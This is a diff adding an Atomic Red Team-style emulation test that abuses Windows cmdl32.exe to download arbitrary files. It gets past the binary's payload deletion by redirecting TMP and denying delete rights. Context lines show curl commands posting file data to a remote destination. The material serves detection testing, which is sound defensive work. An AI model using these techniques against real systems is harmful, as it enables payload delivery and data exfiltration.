@@ -69595,6 +69595,28 @@ command-and-control:
           #{curl_path} -d #{file_path} #{remote_destination}
           #{curl_path} --data #{file_path} #{remote_destination}
         name: command_prompt
+    - name: Download a file with Microsoft Connection Manager Auto-Download
+      auto_generated_guid: d239772b-88e2-4a2e-8473-897503401bcc
+      description: "Uses the cmdl32 to download arbitrary file from the internet.
+        The cmdl32 package is allowed to install the profile used to launch the VPN
+        connection. However, the config is modified to download the arbitary file.
+        \nThe issue of cmdl32.exe detecting and deleting the payload by identifying
+        it as not a VPN Servers profile is avoided by setting a temporary TMP folder
+        and denying the delete permission to all files for the user.\nUpon successful
+        execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        Path_to_file:
+          description: Path to the Batch script
+          type: Path
+          default: PathToAtomicsFolder\T1105\src\T1105.bat
+      executor:
+        command: "#{Path_to_file} 1>NUL \n"
+        cleanup_command: |
+          del /f/s/q %temp%\T1105 >nul 2>&1
+          rmdir /s/q %temp%\T1105 >nul 2>&1
+        name: command_prompt
   T1090.001:
     technique:
       external_references:
